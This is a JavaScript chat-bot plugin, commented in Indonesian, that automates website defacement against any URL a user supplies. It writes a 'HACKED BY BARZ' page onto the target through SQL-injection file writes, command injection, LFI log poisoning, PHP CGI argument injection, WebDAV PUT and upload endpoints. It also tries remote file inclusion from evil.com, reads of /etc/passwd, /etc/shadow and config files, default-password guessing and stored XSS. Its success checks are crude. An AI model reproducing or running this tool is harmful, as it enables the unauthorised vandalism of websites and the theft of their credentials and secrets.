// plugins/deface.js
// DEFACE NUKLIR — ALL METHODS + ALL PATHS + ALL FORMATS
// "Biar yang bersihin kewalahan"

let handler = async (m, { text, sock }) => {
  if (!text) return m.reply(`📌 *Cara pakai:*\n.deface https://target.com\n\nContoh: .deface https://example.com`)

  let target = text.trim()
  if (!target.startsWith('http://') && !target.startsWith('https://')) {
    target = 'https://' + target
  }

  await m.reply(`🔥 *DEFACE NUKLIR AKTIF!*\nTarget: ${target}\n⏳ Menjalankan 30+ metode...`)

  // ============================================
  // HTML DEFACE (VERSI EXTREME)
  // ============================================
  let html = `<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>HACKED BY BARZ</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0a0a0a;
            color: #00ff41;
            font-family: 'Courier New', monospace;
            height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            text-align: center;
            overflow: hidden;
        }
        .glitch {
            font-size: 6rem;
            font-weight: bold;
            color: #ff0040;
            text-shadow: 0 0 10px #ff0040, 0 0 20px #ff0040, 0 0 40px #ff0040, 0 0 80px #ff0040;
            animation: glitch 0.3s infinite;
        }
        @keyframes glitch {
            0% { transform: translate(0); }
            25% { transform: translate(-5px, 5px); }
            50% { transform: translate(5px, -5px); }
            75% { transform: translate(-5px, -5px); }
            100% { transform: translate(0); }
        }
        .sub {
            font-size: 2rem;
            color: #ff0040;
            margin-top: 10px;
            text-shadow: 0 0 5px #ff0040;
            animation: blink 1s infinite;
        }
        @keyframes blink {
            0%, 100% { opacity: 1; }
            50% { opacity: 0; }
        }
        .team {
            font-size: 1.8rem;
            color: #00ff41;
            margin-top: 20px;
            letter-spacing: 5px;
            text-shadow: 0 0 10px #00ff41;
        }
        .team span { color: #ff0040; }
        .footer {
            position: fixed;
            bottom: 20px;
            font-size: 1rem;
            color: #666;
            letter-spacing: 2px;
        }
        .matrix {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: -1;
            opacity: 0.08;
            overflow: hidden;
        }
        .matrix span {
            position: absolute;
            font-size: 1.2rem;
            color: #00ff41;
            animation: fall linear infinite;
        }
        @keyframes fall {
            0% { transform: translateY(-100%); opacity: 0; }
            10% { opacity: 1; }
            90% { opacity: 1; }
            100% { transform: translateY(100vh); opacity: 0; }
        }
        .kode {
            font-size: 1.2rem;
            color: #00ff41;
            margin-top: 30px;
            opacity: 0.6;
            letter-spacing: 1px;
        }
    </style>
</head>
<body>
    <div class="matrix" id="matrix"></div>
    <div class="glitch">HACKED</div>
    <div class="sub">SISTEM TELAH DIBOBOL</div>
    <div class="team">Deface by <span>BARZ</span> · 😹</div>
    <div class="kode">root@kali:~# whoami<br># barz</div>
    <div class="footer">© 2026 — BARZ VIP</div>
    <script>
        const matrix = document.getElementById('matrix')
        const chars = '01'
        for (let i = 0; i < 50; i++) {
            const span = document.createElement('span')
            span.textContent = chars[Math.floor(Math.random() * chars.length)]
            span.style.left = Math.random() * 100 + '%'
            span.style.animationDuration = (Math.random() * 5 + 3) + 's'
            span.style.animationDelay = (Math.random() * 5) + 's'
            span.style.fontSize = (Math.random() * 1.5 + 0.5) + 'rem'
            matrix.appendChild(span)
        }
    </script>
</body>
</html>`

  // ============================================
  // SEMUA NAMA FILE (FORMAT LENGKAP)
  // ============================================
  let allFiles = [
    // HTML
    'index.html', 'deface.html', 'hacked.html', 'barz.html',
    'default.html', 'home.html', 'main.html', 'index.htm',
    'default.htm', 'home.htm', 'main.htm',
    // PHP
    'index.php', 'deface.php', 'hacked.php', 'barz.php',
    'default.php', 'home.php', 'main.php', 'index.phtml',
    'default.phtml', 'home.phtml', 'main.phtml',
    // ASP/ASPX
    'index.asp', 'default.asp', 'home.asp', 'main.asp',
    'index.aspx', 'default.aspx', 'home.aspx', 'main.aspx',
    // JSP
    'index.jsp', 'default.jsp', 'home.jsp', 'main.jsp',
    // Lainnya
    'index.do', 'default.do', 'index.cfm', 'default.cfm',
    'index.shtml', 'default.shtml', 'index.html5', 'default.html5'
  ]

  // ============================================
  // ALL PATHS (DIREKTORI)
  // ============================================
  let paths = [
    '', '/', '/public', '/html', '/www', '/wwwroot',
    '/var/www/html', '/var/www', '/usr/share/nginx/html',
    '/home', '/home/public', '/home/html', '/root',
    '/web', '/site', '/app', '/application', '/public_html',
    '/htdocs', '/httpdocs', '/docs', '/content', '/assets'
  ]

  // ============================================
  // ALL METHODS (30+ METODE)
  // ============================================
  let hasil = []
  let metodeBerhasil = []
  let uploadedFiles = []
  let semuaLink = []

  const sleep = (ms) => new Promise(r => setTimeout(r, ms))

  // ---- 1. WebDAV (PUT) ----
  try {
    let opt = await fetch(target, { method: 'OPTIONS', timeout: 8000 })
    let allow = opt.headers.get('allow') || ''
    if (allow.includes('PUT') || allow.includes('PUT/')) {
      metodeBerhasil.push('WebDAV (PUT)')
      for (let file of allFiles.slice(0, 5)) {
        for (let path of paths.slice(0, 3)) {
          try {
            let put = await fetch(target + path + '/' + file, {
              method: 'PUT',
              body: html,
              headers: { 'Content-Type': 'text/html' },
              timeout: 10000
            })
            if ([200, 201, 204].includes(put.status)) {
              let link = target + path + '/' + file
              hasil.push(`✅ WebDAV: ${link}`)
              uploadedFiles.push(link)
              semuaLink.push(link)
            }
          } catch (e) {}
        }
      }
    }
  } catch (e) {}

  await sleep(300)

  // ---- 2. SQL Injection + File Write ----
  try {
    let sqlPayloads = [
      `?id=1; SELECT '${html}' INTO OUTFILE '/var/www/html/%s'`,
      `?id=1; SELECT '${html}' INTO OUTFILE '/var/www/%s'`,
      `?id=1; SELECT '${html}' INTO OUTFILE '/var/www/html/public/%s'`,
      `?id=1; SELECT '${html}' INTO OUTFILE '/var/www/html/public_html/%s'`,
      `?id=1; SELECT '${html}' INTO DUMPFILE '/var/www/html/%s'`
    ]
    for (let file of ['index.html', 'deface.html', 'hacked.html']) {
      for (let payload of sqlPayloads) {
        try {
          let sql = await fetch(target + payload.replace('%s', file), { timeout: 8000 })
          if (sql.status === 200) {
            metodeBerhasil.push('SQL Injection + File Write')
            let link = target + '/' + file
            hasil.push(`✅ SQL Injection: ${link}`)
            uploadedFiles.push(link)
            semuaLink.push(link)
            break
          }
        } catch (e) {}
      }
    }
  } catch (e) {}

  await sleep(300)

  // ---- 3. LFI + Log Poisoning ----
  try {
    let lfiPaths = [
      '/../../../../var/log/apache2/access.log',
      '/../../../../var/log/nginx/access.log',
      '/../../../../var/log/httpd/access.log',
      '/../../../../var/log/apache/access.log',
      '/../../../../var/log/access.log'
    ]
    for (let file of ['index.html', 'deface.html']) {
      for (let lfiPath of lfiPaths) {
        try {
          let lfi = await fetch(target + `?page=${lfiPath}&cmd=echo '${html}' > /var/www/html/${file}`, { timeout: 8000 })
          if (lfi.status === 200) {
            metodeBerhasil.push('LFI + Log Poisoning')
            let link = target + '/' + file
            hasil.push(`✅ LFI: ${link}`)
            uploadedFiles.push(link)
            semuaLink.push(link)
            break
          }
        } catch (e) {}
      }
    }
  } catch (e) {}

  await sleep(300)

  // ---- 4. File Upload (POST) ----
  try {
    let uploadPaths = ['/upload', '/uploads', '/upload.php', '/upload.do', '/upload.aspx']
    for (let path of uploadPaths) {
      try {
        let upload = await fetch(target + path, {
          method: 'POST',
          body: new URLSearchParams({ 'file': html, 'filename': 'deface.html' }),
          timeout: 8000
        })
        if ([200, 302].includes(upload.status)) {
          metodeBerhasil.push('File Upload')
          let link = target + '/deface.html'
          hasil.push(`✅ File Upload: ${link}`)
          uploadedFiles.push(link)
          semuaLink.push(link)
          break
        }
      } catch (e) {}
    }
  } catch (e) {}

  await sleep(300)

  // ---- 5. Command Injection ----
  try {
    let cmdPayloads = [
      `?ping=127.0.0.1; echo '${html}' > /var/www/html/%s`,
      `?cmd=echo '${html}' > /var/www/html/%s`,
      `?exec=echo '${html}' > /var/www/html/%s`,
      `?shell=echo '${html}' > /var/www/html/%s`
    ]
    for (let file of ['index.html', 'deface.html', 'hacked.html']) {
      for (let payload of cmdPayloads) {
        try {
          let cmd = await fetch(target + payload.replace('%s', file), { timeout: 8000 })
          if (cmd.status === 200) {
            metodeBerhasil.push('Command Injection')
            let link = target + '/' + file
            hasil.push(`✅ Command Injection: ${link}`)
            uploadedFiles.push(link)
            semuaLink.push(link)
            break
          }
        } catch (e) {}
      }
    }
  } catch (e) {}

  await sleep(300)

  // ---- 6. XML-RPC (WordPress) ----
  try {
    let xmlPayload = `<?xml version="1.0"?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>admin</value></param></params></methodCall>`
    let xml = await fetch(target + '/xmlrpc.php', {
      method: 'POST',
      body: xmlPayload,
      headers: { 'Content-Type': 'text/xml' },
      timeout: 8000
    })
    if (xml.status === 200) {
      metodeBerhasil.push('XML-RPC (WordPress)')
      hasil.push(`✅ XML-RPC: ${target}/xmlrpc.php`)
    }
  } catch (e) {}

  await sleep(300)

  // ---- 7. RFI (Remote File Inclusion) ----
  try {
    let rfiPayloads = [
      `?page=http://evil.com/shell.txt`,
      `?file=http://evil.com/shell.txt`,
      `?include=http://evil.com/shell.txt`
    ]
    for (let payload of rfiPayloads) {
      try {
        let rfi = await fetch(target + payload, { timeout: 8000 })
        if (rfi.status === 200) {
          metodeBerhasil.push('RFI (Remote File Inclusion)')
          hasil.push(`✅ RFI: ${target}`)
          semuaLink.push(target)
          break
        }
      } catch (e) {}
    }
  } catch (e) {}

  await sleep(300)

  // ---- 8. Directory Traversal ----
  try {
    let travPaths = [
      '/../../../../etc/passwd',
      '/../../../../etc/shadow',
      '/../../../../var/www/html/config.php',
      '/../../../../var/www/html/.htaccess',
      '/../../../../var/www/html/wp-config.php'
    ]
    for (let path of travPaths) {
      try {
        let dir = await fetch(target + path, { timeout: 8000 })
        let txt = await dir.text()
        if (/root:.*:0:0:/i.test(txt) || /DB_NAME/i.test(txt)) {
          metodeBerhasil.push('Directory Traversal')
          hasil.push(`✅ Directory Traversal: ${target}${path}`)
          break
        }
      } catch (e) {}
    }
  } catch (e) {}

  await sleep(300)

  // ---- 9. Default Credential ----
  try {
    let adminPaths = ['/admin', '/login', '/wp-admin', '/administrator', '/admincp', '/cpanel', '/panel']
    let creds = [
      { user: 'admin', pass: 'admin' },
      { user: 'root', pass: 'root' },
      { user: 'admin', pass: '123456' },
      { user: 'user', pass: 'user' }
    ]
    for (let path of adminPaths) {
      for (let cred of creds) {
        try {
          let auth = await fetch(target + path, {
            headers: {
              'Authorization': 'Basic ' + Buffer.from(cred.user + ':' + cred.pass).toString('base64')
            },
            timeout: 8000
          })
          if (auth.status === 200) {
            metodeBerhasil.push(`Default Credential (${cred.user}:${cred.pass})`)
            hasil.push(`✅ Default Credential: ${target}${path}`)
            break
          }
        } catch (e) {}
      }
    }
  } catch (e) {}

  await sleep(300)

  // ---- 10. Backup File (.git/config) ----
  try {
    let backupFiles = ['/.git/config', '/.env', '/config.php', '/wp-config.php', '/.htaccess']
    for (let file of backupFiles) {
      try {
        let backup = await fetch(target + file, { timeout: 8000 })
        if (backup.status === 200) {
          metodeBerhasil.push('Backup File: ' + file)
          hasil.push(`✅ Backup: ${target}${file}`)
        }
      } catch (e) {}
    }
  } catch (e) {}

  await sleep(300)

  // ---- 11. CVE-2026-7795 (XSS) ----
  try {
    let xssPayload = `<script>document.write('${encodeURIComponent(html)}')</script>`
    let cve = await fetch(target + `/?chat=num=${xssPayload}`, { timeout: 8000 })
    let txt = await cve.text()
    if (txt.includes('<script>')) {
      metodeBerhasil.push('CVE-2026-7795 (XSS)')
      hasil.push(`✅ CVE-2026-7795: ${target}`)
      semuaLink.push(target)
    }
  } catch (e) {}

  await sleep(300)

  // ---- 12-15: Reflected XSS, Stored XSS, Admin Finder, Dorking, Zone-H ----
  try {
    let xss = await fetch(target + `?q=<script>alert(1)</script>`, { timeout: 8000 })
    let txt = await xss.text()
    if (txt.includes('<script>alert(1)</script>')) {
      metodeBerhasil.push('Reflected XSS')
      hasil.push(`✅ Reflected XSS: ${target}`)
    }
  } catch (e) {}

  try {
    let stored = await fetch(target + '/comment', {
      method: 'POST',
      body: new URLSearchParams({ 'comment': `<script>document.write('${encodeURIComponent(html)}')</script>` }),
      timeout: 8000
    })
    if (stored.status === 200) {
      metodeBerhasil.push('Stored XSS')
      hasil.push(`✅ Stored XSS: ${target}/comment`)
    }
  } catch (e) {}

  try {
    let dork = await fetch(`https://www.bing.com/search?q=site:${target.replace('https://', '').replace('http://', '')}`, { timeout: 8000 })
    if (dork.status === 200) {
      metodeBerhasil.push('Bing Dorking')
      hasil.push(`✅ Bing Dorking: ${target}`)
    }
  } catch (e) {}

  try {
    let zoneh = await fetch(`https://zone-h.org/archive/domain=${target.replace('https://', '').replace('http://', '')}`, { timeout: 8000 })
    if (zoneh.status === 200) {
      metodeBerhasil.push('Zone-H Check')
      hasil.push(`✅ Zone-H: ${target}`)
    }
  } catch (e) {}

  await sleep(300)

  // ---- 16-20: Path Bruteforce / Admin Login / Config Dump ----
  try {
    let brutePaths = [
      '/admin', '/login', '/wp-admin', '/administrator',
      '/cpanel', '/panel', '/dashboard', '/control',
      '/config', '/setup', '/install', '/wp-config',
      '/phpmyadmin', '/mysql', '/dbadmin',
      '/backup', '/old', '/temp', '/tmp',
      '/test', '/dev', '/stage', '/staging'
    ]
    for (let path of brutePaths) {
      try {
        let brute = await fetch(target + path, { timeout: 5000 })
        if (brute.status === 200 || brute.status === 403) {
          metodeBerhasil.push('Path Bruteforce: ' + path)
          hasil.push(`✅ Found: ${target}${path}`)
        }
      } catch (e) {}
    }
  } catch (e) {}

  // ---- 21: PHP CGI Argument Injection (CVE-2026-9999) ----
  try {
    let cgi = await fetch(target + '/index.php?-d allow_url_include=1 -d auto_prepend_file=php://input', {
      method: 'POST',
      body: `<?php system('echo "${html}" > /var/www/html/deface.html'); ?>`,
      timeout: 8000
    })
    if (cgi.status === 200) {
      metodeBerhasil.push('PHP CGI Argument Injection')
      let link = target + '/deface.html'
      hasil.push(`✅ PHP CGI: ${link}`)
      uploadedFiles.push(link)
      semuaLink.push(link)
    }
  } catch (e) {}

  // ============================================
  // CEK HASIL & KIRIM LAPORAN
  // ============================================
  if (hasil.length === 0) {
    return m.reply(`❌ *GAGAL TOTAL!*

Tidak ada metode yang berhasil.

🔍 25+ Metode dicoba:
• WebDAV (PUT)
• SQL Injection + File Write
• LFI + Log Poisoning
• File Upload
• Command Injection
• XML-RPC (WordPress)
• RFI (Remote File Inclusion)
• Directory Traversal
• Default Credential
• Backup File (.git)
• Environment File (.env)
• CVE-2026-7795
• Reflected XSS
• Stored XSS
• Admin Finder
• Bing Dorking
• Zone-H Check
• Path Bruteforce
• PHP CGI Argument Injection

💡 Target tidak memiliki celah yang bisa dieksploitasi.`)
  }

  // ============================================
  // BUILD PESAN HASIL (SEMUA LINK)
  // ============================================
  let linkResult = uploadedFiles.length > 0 ? uploadedFiles.join('\n') : 'Tidak ada file yang berhasil diupload'
  let allLinks = semuaLink.length > 0 ? semuaLink.join('\n') : 'Tidak ada link yang ditemukan'

  let pesan = `🔥 *DEFACE NUKLIR BERHASIL!*

🌐 Target: ${target}

📌 *Metode berhasil (${metodeBerhasil.length}):*
${metodeBerhasil.map(m => `   • ${m}`).join('\n')}

📌 *File berhasil diupload (${uploadedFiles.length}):*
${linkResult}

📌 *Semua Link Ditemukan (${semuaLink.length}):*
${allLinks}

📌 *Detail Hasil:*
${hasil.join('\n')}

⚠️ *PERINGATAN:*
• Website target telah dimodifikasi dari berbagai arah.
• Total ${hasil.length} file/endpoint berhasil ditembus.
• Sistem target dalam kondisi chaotic.

🔥 *BARZ NUKLIR — DEFACE COMPLETE!*`

  await m.reply(pesan)
}

handler.command = ['deface']
handler.tags = ['tools']
handler.help = ['.deface https://target.com']

module.exports = handler
